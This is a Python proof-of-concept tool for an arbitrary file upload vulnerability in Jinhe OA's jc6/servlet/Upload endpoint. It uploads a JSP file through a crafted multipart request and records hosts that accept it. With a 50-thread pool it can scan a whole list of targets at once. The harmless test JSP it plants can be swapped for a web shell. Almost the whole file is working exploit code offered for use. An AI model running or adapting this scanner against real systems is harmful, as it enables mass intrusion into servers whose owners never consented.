#金和OA jc6/servlet/Upload接口任意文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


     ██╗██╗███╗   ██╗██╗  ██╗███████╗     ██████╗  █████╗       ███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
     ██║██║████╗  ██║██║  ██║██╔════╝    ██╔═══██╗██╔══██╗      ██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
     ██║██║██╔██╗ ██║███████║█████╗█████╗██║   ██║███████║█████╗█████╗  ██║██║     █████╗█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██   ██║██║██║╚██╗██║██╔══██║██╔══╝╚════╝██║   ██║██╔══██║╚════╝██╔══╝  ██║██║     ██╔══╝╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
╚█████╔╝██║██║ ╚████║██║  ██║███████╗    ╚██████╔╝██║  ██║      ██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
 ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                                                                 
                                                            author:zm
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is Jinhe OA jc6/servlet/Upload interface arbitrary file upload vulnerability")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/"
    headers = {     
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Content-Type': 'multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d',
    }
    data = "--ee055230808ca4602e92d0b7c4ecc63d\r\nContent-Disposition: form-data; name=\"img\"; filename=\"1.jsp\"Content-Type: image/jpeg\r\n\r\n<% out.println('tteesstt1'); %>\r\n--ee055230808ca4602e92d0b7c4ecc63d--\r\n\r\n\r\n"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 200 and 'upload' in res1.text:
            print(f"[+]{target} have loophole “{target+payload}”")
            with open ('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass

if __name__ == "__main__":
    main()